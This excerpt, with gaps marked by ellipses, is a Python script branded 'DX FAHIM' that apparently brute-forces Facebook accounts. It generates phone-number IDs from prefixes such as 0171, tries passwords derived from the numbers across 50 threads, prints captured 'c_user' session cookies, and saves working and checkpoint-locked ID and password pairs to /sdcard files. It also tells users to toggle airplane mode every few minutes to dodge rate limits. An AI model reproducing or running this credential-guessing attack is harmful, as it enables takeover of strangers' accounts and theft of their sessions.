...
#FACEBOOK : https://www.facebook.com/profile.php?id=100073557657822
#OWNER : DX FAHIM
# -----------------[ DX FAHIM ]-------------------#
...
today = date.today()
logo = ("""
 _______   __     ______      _    _ _____ __  __ 
 |  __ \ \ / /    |  ____/\   | |  | |_   _|  \/  |
 | |  | \ V /_____| |__ /  \  | |__| | | | | \  / |
 | |  | |> <______|  __/ /\ \ |  __  | | | | |\/| |
 | |__| / . \     | | / ____ \| |  | |_| |_| |  | |
 |_____/_/ \_\    |_|/_/    \_\_|  |_|_____|_|  |_|
  ...
  [ 𝑭𝑶𝑳𝑳𝑶𝑾  𝑴𝒀 𝑭𝑨𝑪𝑬𝑩𝑶𝑶𝑲  𝑨𝑵𝑫  𝑵𝑬𝑾  𝑪𝑶𝑴𝑴𝑨𝑵𝑫 ] 
         𝑾𝑬𝑳𝑪𝑶𝑴𝑬  𝑻𝑶  𝑴𝒀  𝑭𝑨𝑪𝑬𝑩𝑶𝑶𝑲\033[1;36m                                            
══════════════════════════════════════════════════════           
 [🙂] 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 :  𝑫𝑿 𝑭𝑨𝑯𝑰𝑴\_______ ;* :/ 3:) ‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎
 [🙂] 𝐆𝐈𝐓𝐇𝐔𝐁        :  𝑫𝑿 - 𝑭𝑨𝑯𝑰𝑴
 [🙂] 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  :  𝑯𝑰𝑫𝑬
 [🙂]𝐓𝐎𝐎𝐋𝐒           :  𝑷𝑨𝑰𝑫
 [🙂] 𝐕𝐈𝐑𝐒𝐈𝐎𝐍       :  0.01
...
def umo_in():
    ...
    print(logo)
    shoha()
    print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Example : {xr}013, 016, 017, 018, 019{x}')
    print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Example : {xr}+91, 91123, 9122, 91778{x}')
    shoha()
    rk1 = '0171'
    rk2 = '0172'
    rk3 = '0175'
    ...
    os.system('clear')
    print(logo)
    limit = int(input(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m EXAMPLE : 10000, 20000, 30000, 40000, 50000 \n \033[1;93m××××××××××××××××××××××××××××××××××××××××××××××××× \n \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m PUT CLONING LIMIT: '))
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;91m USE AEROPLANE MOOD IN EVERY 3 MIN ')
        shoha()
        for love in user:
            pwx = [love[1:]]
            uid = code+love
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[FAHIM]-OK] ' +cid+ ' | ' +ps+    '  \n \033[1;33mCOOKIE= \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/[FAHIM]-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;31m [FAHIM]-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/[FAHIM]-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr} [DX_FAHIM] {x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
